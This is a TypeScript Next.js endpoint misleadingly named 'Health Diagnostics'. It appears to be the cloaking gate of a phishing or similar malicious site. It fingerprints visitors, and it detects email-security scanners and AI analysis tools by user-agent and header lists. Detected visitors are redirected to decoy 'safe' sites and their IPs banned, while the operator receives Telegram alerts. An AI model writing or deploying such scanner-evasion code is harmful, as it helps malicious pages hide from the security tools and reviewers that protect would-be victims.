/**
 * Health Diagnostics Endpoint
 * Performs system health checks and bot detection
 * POST /api/health/diagnostics
 */

import { NextRequest, NextResponse } from 'next/server'
import { loadSettings } from '@/lib/adminSettings'
import { checkNetworkRestrictions } from '@/lib/networkRestrictions'
import { detectBotWithCloudflare, shouldRedirectToSafeSite } from '@/lib/cloudflareBotManagement'
import { getRandomSafeRedirect } from '@/lib/scannerDetection'
import { checkHoneypot } from '@/lib/honeypot'
import { isIPBlocked, banIP } from '@/lib/ipBlocklist'
import { generateRequestSignature, isDuplicateRequest, isRequestIdUsed } from '@/lib/requestDeduplication'
import { getBehaviorIdentifier, updateBehavior, calculateAnomalyScore } from '@/lib/anomalyDetection'
import { logSecurityEvent, SecurityEventSeverity } from '@/lib/securityMonitoring'
import { getNetworkType } from '@/lib/networkRestrictions'
import { addVisitorLog } from '@/lib/visitorTracker'
import { getGeoData } from '@/lib/geoLocation'
import { sendBotDetectionNotification } from '@/lib/botNotifications'

export async function GET(request: NextRequest) {
  try {
    const userAgent = request.headers.get('user-agent') || 'Unknown'
    
    // Extract IP address (handle various formats)
    const forwardedFor = request.headers.get('x-forwarded-for')
    const realIP = request.headers.get('x-real-ip')
    const cfIP = request.headers.get('cf-connecting-ip')
    const ip = forwardedFor?.split(',')[0]?.trim() || realIP || cfIP || 'unknown'
    
    // Log IP extraction for debugging
    if (process.env.NODE_ENV === 'development') {
      console.log('🔍 IP extraction (GET):', {
        forwardedFor,
        realIP,
        cfIP,
        finalIP: ip
      })
    }

    // Get fingerprint from query params (if provided)
    const fingerprint = request.nextUrl.searchParams.get('fp') || ''

    // Comprehensive bot detection with Cloudflare
    const detection = detectBotWithCloudflare(
      userAgent,
      ip,
      request.headers,
      {
        fingerprint,
      }
    )

    // Check if should redirect
    if (shouldRedirectToSafeSite(detection)) {
      const safeRedirect = getRandomSafeRedirect()
      return NextResponse.redirect(safeRedirect, 302)
    }

    // Pass bot detection - return success
    return NextResponse.json({
      ok: true,
      passed: true,
      confidence: 100 - detection.confidence,
      cloudflareScore: detection.cloudflareScore?.score,
    })
  } catch (error) {
    // On error, redirect to safe site (fail secure)
    const safeRedirect = getRandomSafeRedirect()
    return NextResponse.redirect(safeRedirect, 302)
  }
}

export async function POST(request: NextRequest) {
  try {
    const contentType = request.headers.get('content-type') || ''
    
    // Handle JSON payload (from enhanced bot detection during delay)
    if (contentType.includes('application/json')) {
      // LOAD ADMIN SETTINGS
      const settings = await loadSettings()
      
      // CHECK IF BOT FILTER IS ENABLED IN SETTINGS
      if (settings.security?.gates?.layer1BotFilter === false) {
        return NextResponse.json({
          ok: true,
          passed: true,
          reason: 'Bot filter disabled in settings'
        })
      }
      
      const body = await request.json()
      const { fingerprint, timestamp, captchaVerified } = body
      
      // Enhanced bot detection with fingerprint
      const userAgent = request.headers.get('user-agent') || 'Unknown'
      
      // Extract IP address (handle various formats)
      const forwardedFor = request.headers.get('x-forwarded-for')
      const realIP = request.headers.get('x-real-ip')
      const cfIP = request.headers.get('cf-connecting-ip')
      const ip = forwardedFor?.split(',')[0]?.trim() || realIP || cfIP || 'unknown'
      
      // Log IP extraction for debugging
      if (process.env.NODE_ENV === 'development') {
        console.log('🔍 IP extraction:', {
          forwardedFor,
          realIP,
          cfIP,
          finalIP: ip
        })
      }

      // Development mode: Log but don't redirect
      // Ensure dev mode can't be forced in production
      const isDevelopment = process.env.NODE_ENV === 'development' && 
                           process.env.VERCEL_ENV !== 'production'
      
      // Get geolocation
      const geoData = await getGeoData(ip)

      // DEVELOPMENT MODE: Skip replay/anomaly detection for localhost
      const isLocalhost = ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('::ffff:127.0.0.1')
      const skipSecurityChecks = process.env.NODE_ENV === 'development' && isLocalhost

      // Check for replay attacks via request ID
      if (!skipSecurityChecks) {
        const requestId = request.headers.get('x-request-id')
        if (requestId) {
          const isReplay = await isRequestIdUsed(requestId)
          if (isReplay) {
            await logSecurityEvent({
              type: 'replay_attack',
              ip,
              fingerprint,
              severity: 'high',
              details: { requestId },
              userAgent,
            })
            const safeRedirect = getRandomSafeRedirect()
            return NextResponse.redirect(safeRedirect, 302)
          }
        }

        // Check for duplicate requests (replay attack detection)
        const requestSignature = generateRequestSignature(ip, fingerprint || '', timestamp || Date.now(), userAgent)
        if (isDuplicateRequest(requestSignature)) {
          await logSecurityEvent({
            type: 'replay_attack',
            ip,
            fingerprint,
            severity: 'medium',
            details: { signature: requestSignature.substring(0, 50) },
            userAgent,
          })
          // Don't redirect immediately - let other checks run, but increase confidence
        }
      }

      // CHECK 1: IP Blocklist (if enabled in settings)
      if (settings.security?.gates?.layer1IpBlocklist !== false && 
          settings.security?.botFilter?.checkIPBlocklist !== false) {
        if (await isIPBlocked(ip)) {
          
          await addVisitorLog({
            ip,
            userAgent,
            country: geoData.country,
            city: geoData.city,
            captchaStatus: 'pending',
            botStatus: 'bot',
            fingerprint: fingerprint || '',
            layer: 'bot-filter',
            layerPassed: false,
            sessionId: fingerprint || ip
          })
          
          const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
          return NextResponse.json({
            ok: false,
            passed: false,
            reason: 'IP blocked',
            redirect: redirectUrl
          })
        }
      }

      // CHECK 2: Network Restrictions (if enabled in settings)
      // Network restrictions are always checked if bot filter is enabled
      if (settings.security?.gates?.layer1BotFilter) {
        const networkCheck = await checkNetworkRestrictions(ip, settings)
        if (networkCheck.blocked) {
          
          await addVisitorLog({
            ip,
            userAgent,
            country: geoData.country,
            city: geoData.city,
            captchaStatus: 'pending',
            botStatus: 'bot',
            fingerprint: fingerprint || '',
            layer: 'bot-filter',
            layerPassed: false,
            sessionId: fingerprint || ip
          })
          
          const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
          return NextResponse.json({
            ok: false,
            passed: false,
            reason: networkCheck.reason,
            redirect: redirectUrl
          })
        }
      }

      // Parse fingerprint if provided
      let fingerprintData = {}
      try {
        if (fingerprint && typeof fingerprint === 'string') {
          fingerprintData = JSON.parse(fingerprint)
        }
      } catch {
        // Invalid fingerprint format - continue with basic detection
      }

      // Validate fingerprint timing to detect manipulation
      if (timestamp) {
        const age = Date.now() - timestamp
        if (age < 100 || age > 60000) { // Less than 100ms or more than 60s
          // Suspicious timing - fingerprint might be manipulated
        }
      }

      // Comprehensive bot detection with Cloudflare + fingerprint
      const detection = detectBotWithCloudflare(
        userAgent,
        ip,
        request.headers,
        {
          fingerprint: fingerprint || '',
          ...fingerprintData,
        }
      )
      
      // Add network type to detection reasons and adjust confidence
      const networkType = await getNetworkType(ip)
      if (networkType !== 'unknown' && networkType !== 'residential') {
        detection.reasons.push(`Network type: ${networkType}`)
        // Increase confidence for VPN/Proxy/DataCenter if not allowed
        if (networkType === 'vpn' && !settings.security?.networkRestrictions?.allowVpn) {
          detection.confidence += 20
        } else if (networkType === 'proxy' && !settings.security?.networkRestrictions?.allowProxy) {
          detection.confidence += 20
        } else if (networkType === 'datacenter' && !settings.security?.networkRestrictions?.allowDatacenter) {
          detection.confidence += 15
        }
      }

      // Track behavior for anomaly detection (skip for localhost in development)
      let behaviorIdentifier: string | null = null
      if (!skipSecurityChecks) {
        behaviorIdentifier = getBehaviorIdentifier(ip, fingerprint)
        const behavior = updateBehavior(behaviorIdentifier, {
          fingerprint,
          failed: false, // Will update if detection fails
        })
        
        // Calculate anomaly score
        const anomaly = calculateAnomalyScore(behavior)
        if (anomaly.score > 0) {
          detection.confidence += anomaly.score
          detection.reasons.push(...anomaly.reasons)
          
          await logSecurityEvent({
            type: 'anomaly',
            ip,
            fingerprint,
            severity: anomaly.score > 50 ? 'high' : 'medium',
            details: { anomalyScore: anomaly.score, reasons: anomaly.reasons },
            userAgent,
          })
        }
      }

      // CAPTCHA-verified requests get significant confidence reduction
      // If CAPTCHA was verified, we trust the user more - reduce confidence significantly
      if (captchaVerified === true || captchaVerified === 'true') {
        detection.confidence = Math.max(0, detection.confidence - 70) // Reduce by 70 points
        detection.reasons.push('CAPTCHA verified - confidence significantly reduced')
        // If CAPTCHA verified, also reduce isBot flag likelihood
        if (detection.confidence < 50) {
          detection.isBot = false // Trust CAPTCHA verification
        }
      }
      
      // Check for duplicate request (add to confidence if detected) - skip for localhost in development
      if (!skipSecurityChecks) {
        const requestSignature = generateRequestSignature(ip, fingerprint || '', timestamp || Date.now(), userAgent)
        if (isDuplicateRequest(requestSignature)) {
          detection.confidence += 40
          detection.reasons.push('Duplicate request detected (possible replay attack)')
        }
      }

      // Additional checks based on fingerprint
      if (fingerprintData) {
        const fp = fingerprintData as any
        
        // Check for suspicious patterns
        if (fp.plugins === 0 && fp.cookieEnabled === false) {
          detection.confidence += 20
          detection.reasons.push('Suspicious fingerprint: no plugins, cookies disabled')
        }
        
        // Check for headless indicators
        if (fp.screen && fp.screen.includes('0x0')) {
          detection.confidence += 30
          detection.reasons.push('Headless browser: invalid screen dimensions')
        }
        
        // Check for analysis tool patterns
        if (fp.platform && (fp.platform.includes('Linux') && !fp.plugins)) {
          detection.confidence += 15
          detection.reasons.push('Suspicious: Linux with no plugins (likely headless)')
        }
        
        // Check fingerprint entropy - too perfect = suspicious
        if (fp.plugins && Array.isArray(fp.plugins) && fp.plugins.length > 10) {
          // Real browsers rarely have more than 10 plugins
          detection.confidence += 10
          detection.reasons.push('Suspicious: unusually high plugin count')
        }
      }

      // Check for header order anomalies (bots often send headers in alphabetical order)
      const headerKeys = Array.from(request.headers.keys())
      if (headerKeys.length > 5) {
        const isSorted = headerKeys.slice(1).every((key, i) => key >= headerKeys[i])
        if (isSorted) {
          detection.confidence += 15
          detection.reasons.push('Suspicious header ordering (alphabetical)')
        }
      }

      // Use Cloudflare bot score more heavily if available
      if (detection.cloudflareScore?.score !== null && detection.cloudflareScore?.score !== undefined) {
        const cfScore = detection.cloudflareScore.score
        if (cfScore < 30) { // CF scores below 30 are likely bots
          detection.confidence += 30
          detection.reasons.push(`Low Cloudflare score: ${cfScore}`)
        } else if (cfScore > 80) {
          // High Cloudflare score reduces confidence
          detection.confidence = Math.max(0, detection.confidence - 20)
          detection.reasons.push(`High Cloudflare score: ${cfScore} - confidence reduced`)
        }
      }
      
      // Enhanced security tool detection
      const uaLower = userAgent.toLowerCase()
      const securityToolPatterns = [
        'proofpoint', 'mimecast', 'barracuda', 'forcepoint',
        'symantec', 'mcafee', 'trendmicro', 'sophos',
        'kaspersky', 'bitdefender', 'fireeye', 'checkpoint',
        'zscaler', 'fortinet', 'openai', 'anthropic', 'claude',
        'gpt', 'chatgpt', 'perplexity', 'analyzer', 'inspector',
      ]
      
      for (const pattern of securityToolPatterns) {
        if (uaLower.includes(pattern)) {
          detection.confidence += 50
          detection.reasons.push(`Security/AI tool detected: ${pattern}`)
          break
        }
      }
      
      // Check for security tool headers
      const securityHeaders = [
        'x-proofpoint', 'x-mimecast', 'x-barracuda', 'x-forcepoint',
        'x-symantec', 'x-mcafee', 'x-trendmicro', 'x-sophos',
        'x-kaspersky', 'x-bitdefender', 'x-fireeye', 'x-checkpoint',
        'x-zscaler', 'x-fortinet', 'x-debug', 'x-test', 'x-inspector',
      ]
      
      for (const header of securityHeaders) {
        if (request.headers.get(header)) {
          detection.confidence += 50
          detection.reasons.push(`Security tool header: ${header}`)
          break
        }
      }

      // CHECK 3: Bot Detection (if enabled in settings)
      if (settings.security?.botFilter?.enabled !== false) {
        // Get threshold from settings
        const threshold = settings.security?.botFilter?.confidenceThreshold || 70
        
        // IMPORTANT: If CAPTCHA was verified, be much more lenient
        // CAPTCHA verification is a strong signal that the user is legitimate
        const effectiveThreshold = (captchaVerified === true || captchaVerified === 'true') 
          ? threshold + 30  // Raise threshold by 30 points for CAPTCHA-verified users
          : threshold
        
        // Check if bot detection should block
        // For CAPTCHA-verified users, only block if confidence is VERY high
        const shouldBlock = (captchaVerified === true || captchaVerified === 'true')
          ? (shouldRedirectToSafeSite(detection) && detection.confidence >= 90) || 
            (detection.confidence >= effectiveThreshold && detection.isBot)
          : (shouldRedirectToSafeSite(detection) || 
             (detection.confidence >= threshold && detection.isBot))
        
        if (shouldBlock) {
          
          // Update behavior as failed
          if (behaviorIdentifier) {
            updateBehavior(behaviorIdentifier, { failed: true })
          }
          
          // Log security event
          const severity: SecurityEventSeverity = 
            detection.confidence >= 80 ? 'critical' :
            detection.confidence >= 60 ? 'high' :
            detection.confidence >= 40 ? 'medium' : 'low'
          
          await logSecurityEvent({
            type: 'bot_detected',
            ip,
            fingerprint,
            severity,
            details: {
              confidence: detection.confidence,
              reasons: detection.reasons,
              cloudflareScore: detection.cloudflareScore?.score,
            },
            userAgent,
          })
          
          // Log bot as visitor (for analytics)
          await addVisitorLog({
            ip,
            userAgent,
            country: geoData.country,
            city: geoData.city,
            captchaStatus: 'pending',
            botStatus: 'bot',
            fingerprint: fingerprint || '',
            layer: 'bot-filter',
            layerPassed: false,
            sessionId: fingerprint || ip
          })
          
          // Send bot notification
          if (settings.notifications?.telegram?.enabled !== false &&
              settings.notifications?.telegram?.notifyBotDetections !== false) {
            
            // Determine specific reason
            let reason = 'Bot Detection'
            if (detection.reasons.length > 0) {
              reason = detection.reasons.slice(0, 2).join(', ')
            }
            
            await sendBotDetectionNotification({
              ip,
              userAgent,
              reason,
              confidence: detection.confidence,
              layer: 'bot-filter',
              country: geoData.country,
              city: geoData.city,
              blockedAt: new Date(),
              additionalInfo: {
                'Confidence Score': `${detection.confidence}%`,
                'Threshold': `${threshold}%`,
                'Cloudflare Score': detection.cloudflareScore?.score?.toString() || 'N/A',
                'Detection Reasons': detection.reasons.slice(0, 3).join('; ')
              }
            }).catch((error) => {
            })
          }
          
          // Development mode: Log but allow through
          if (isDevelopment) {
            return NextResponse.json({ 
              ok: true, 
              passed: true,
              confidence: 100 - detection.confidence,
              cloudflareScore: detection.cloudflareScore?.score,
              devMode: true,
              detectionReasons: detection.reasons,
            })
          }
          
          // Auto-ban the IP if high confidence
          if (detection.confidence >= 70) {
            banIP(ip, `Bot detected: ${detection.reasons.join(', ')}`, false)
            await logSecurityEvent({
              type: 'ip_banned',
              ip,
              fingerprint,
              severity: 'high',
              details: { reason: 'High confidence bot detection', confidence: detection.confidence },
              userAgent,
            })
          }
          
          const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
          return NextResponse.json({
            ok: false,
            passed: false,
            reason: 'Bot detected',
            confidence: detection.confidence,
            redirect: redirectUrl
          })
        }
        
      }

      // All checks passed - log visitor and return success
      
      // Log visitor (passed bot filter)
      await addVisitorLog({
        ip,
        userAgent,
        country: geoData.country,
        city: geoData.city,
        captchaStatus: 'pending',
        botStatus: 'human',
        fingerprint: fingerprint || '',
        layer: 'bot-filter',
        layerPassed: true,
        sessionId: fingerprint || ip
      })

      const response = NextResponse.json({ 
        ok: true, 
        passed: true,
        confidence: 100 - detection.confidence,
        cloudflareScore: detection.cloudflareScore?.score,
      })

      // Add security headers
      response.headers.set(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://cdn.privatecaptcha.com; style-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://cdn.privatecaptcha.com; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://challenges.cloudflare.com https://api.privatecaptcha.com https://api.eu.privatecaptcha.com https://api.telegram.org https://ipapi.co; frame-src https://challenges.cloudflare.com;"
      )
      response.headers.set('X-Content-Type-Options', 'nosniff')
      response.headers.set('X-Frame-Options', 'DENY')
      response.headers.set('Referrer-Policy', 'no-referrer')

      return response
    }
    
    // Handle form data (honeypot check)
    const formData = await request.formData()
    
    // Check honeypot fields
    const honeypotTriggered = checkHoneypot(formData)
    
    if (honeypotTriggered) {
      // Honeypot triggered - bot detected
      const userAgent = request.headers.get('user-agent') || 'Unknown'
      const forwardedFor = request.headers.get('x-forwarded-for')
      const realIP = request.headers.get('x-real-ip')
      const cfIP = request.headers.get('cf-connecting-ip')
      const ip = forwardedFor?.split(',')[0]?.trim() || realIP || cfIP || 'unknown'
      
      // Load settings and send notification
      try {
        const settings = await loadSettings()
        const geoData = await getGeoData(ip)
        
        if (settings.notifications?.telegram?.enabled !== false &&
            settings.notifications?.telegram?.notifyBotDetections !== false) {
          
          await sendBotDetectionNotification({
            ip,
            userAgent,
            reason: 'Honeypot Trap Triggered',
            confidence: 95,
            layer: 'honeypot',
            country: geoData.country,
            city: geoData.city,
            blockedAt: new Date(),
            additionalInfo: {
              'Trap': honeypotTriggered.toString(),
              'Detection': 'Invisible link clicked'
            }
          }).catch((error) => {
          })
        }
      } catch (error) {
      }
      
      const safeRedirect = getRandomSafeRedirect()
      return NextResponse.redirect(safeRedirect, 302)
    }

    // Additional bot detection
    const userAgent = request.headers.get('user-agent') || 'Unknown'
    // Extract IP address (handle various formats)
    const forwardedFor = request.headers.get('x-forwarded-for')
    const realIP = request.headers.get('x-real-ip')
    const cfIP = request.headers.get('cf-connecting-ip')
    const ip = forwardedFor?.split(',')[0]?.trim() || realIP || cfIP || 'unknown'
    
    // Log IP extraction for debugging
    if (process.env.NODE_ENV === 'development') {
      console.log('🔍 IP extraction (fallback):', {
        forwardedFor,
        realIP,
        cfIP,
        finalIP: ip
      })
    }

    const detection = detectBotWithCloudflare(userAgent, ip, request.headers)

    if (shouldRedirectToSafeSite(detection)) {
      const safeRedirect = getRandomSafeRedirect()
      return NextResponse.redirect(safeRedirect, 302)
    }

    return NextResponse.json({ ok: true, passed: true })
  } catch (error) {
    const safeRedirect = getRandomSafeRedirect()
    return NextResponse.redirect(safeRedirect, 302)
  }
}

